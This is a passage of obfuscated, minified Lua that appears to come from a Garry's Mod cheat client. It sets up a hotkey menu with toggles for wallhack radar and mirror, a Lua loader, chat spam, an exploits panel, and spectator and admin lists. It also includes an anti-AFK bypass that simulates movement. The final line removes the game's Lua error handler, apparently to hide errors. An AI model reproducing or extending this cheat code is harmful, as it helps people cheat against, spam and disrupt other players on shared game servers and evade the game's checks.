U["logs"]ac:Hide()else U["logs"]=not U["logs"]ac:Show()end end,44,6+27)a6(1,"Target","itemlist",function()if U["itemlist"]then U["itemlist"]=not U["itemlist"]aB:Hide()else U["itemlist"]=not U["itemlist"]aB:Show()end end,65-10,6+27+27)a6(1,"Loader","glualoder",function()if U["glualoder"]then U["glualoder"]=not U["glualoder"]aZ:Hide()else U["glualoder"]=not U["glualoder"]aZ:Show()end end,57,6+27+27+27)a6(2,"Radar","WH_RADAR",function()end,50,6+27+27+27+27)a6(2,"Mirror","WH_MIRROR",function()end,51,6+27+27+27+27+27)a6(2,"Spectators list","MISC_SPECTATORLIST",function()end,105,6+27+27+27+27+27+27)a6(1,"Spam","spam",function()if U["spam"]then U["spam"]=not U["spam"]al:Hide()else U["spam"]=not U["spam"]al:Show()end end,49,6+27+27+27+27+27+27+27)a6(1,"Exploits","exploit",function()if U["exploit"]then U["exploit"]=not U["exploit"]ax:Hide()else U["exploit"]=not U["exploit"]ax:Show()end end,65,6+27+27+27+27+27+27+27+27)a6(2,"Admins list","MISC_ADMINLIST",function()end,90,6+27+27+27+27+27+27+27+27+27)end)ba:Hide()local bs,bt,bu=0,0,0;hook.Add("Think","fff",function()if n["MISC_ANTIANTIAFK"]and IsInGame()then if input.IsKeyDown(KEY_W)or input.IsKeyDown(KEY_S)or input.IsKeyDown(KEY_D)or input.IsKeyDown(KEY_A)then bu=0 else bu=bu+1 end;if bu>1000 then RunConsoleCommand("+forward")timer.Simple(0.3,function()RunConsoleCommand("-forward")end)bu=0 end end;if input.IsKeyDown(n["MENU_OPENKEY"])and bt==0 then if bs==0 then gui.ActivateGameUI()ba:Show()if U["spam"]and IsValid(al)then al:Show()end;if U["logs"]then ac:Show()end;if U["itemlist"]then aB:Show()end;if U["glualoder"]then aZ:Show()end;if U["exploit"]and IsValid(ax)then ax:Show()end;if U["configs"]and IsValid(aQ)then aQ:Show()end;bs=1 elseif bs==1 then gui.HideGameUI()ba:Hide()if U["spam"]and IsValid(al)then al:Hide()end;if U["logs"]then ac:Hide()end;if U["itemlist"]then aB:Hide()end;if U["glualoder"]then aZ:Hide()end;if U["exploit"]and IsValid(ax)then ax:Hide()end;if U["configs"]and IsValid(aQ)then aQ:Hide()end;bs=0 end;bt=1;timer.Simple(0.3,function()bt=0 end)end end)end)hook.Remove("OnLuaError","MenuErrorHandler")
